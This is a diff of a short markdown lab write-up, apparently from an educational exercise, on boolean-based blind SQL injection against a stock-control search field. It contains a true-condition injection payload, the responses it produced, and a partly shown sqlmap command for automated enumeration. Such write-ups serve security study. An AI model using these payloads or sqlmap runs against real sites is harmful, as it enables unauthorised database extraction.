@@ -1,9 +1,11 @@
 # Boolean-Based Blind SQL Injection
 
 ## 🎯 Objective
+
 Extract database information through boolean-based blind SQL injection techniques.
 
 ## 🔍 Vulnerability Analysis
+
 - **Type**: Boolean-Based Blind SQL Injection
 - **Target**: Stock control system search functionality
 - **Parameter**: Search field accepting user input
@@ -13,6 +15,7 @@ Extract database information through boolean-based blind SQL injection technique
 ## 💥 Exploitation
 
 ### Boolean Condition Testing
+
 **True Condition**: `iphone11' AND '1'='1`
 **Response**: "Available in stock"
 
@@ -20,6 +23,7 @@ Extract database information through boolean-based blind SQL injection technique
 **Response**: "Not available in stock"
 
 ### Automated Enumeration
+
 ```bash
 sqlmap -u "https://target/" --data="search=iphone11" \
   --string="available in stock" \
@@ -45,3 +49,4 @@ Tool Proficiency: Using sqlmap with response-based detection flags
 Patience and Precision: Methodical data extraction bit by bit
 
 Conducted in controlled environment for educational purposes. All sensitive information (IPs, credentials, session tokens) has been sanitized for security.
+```
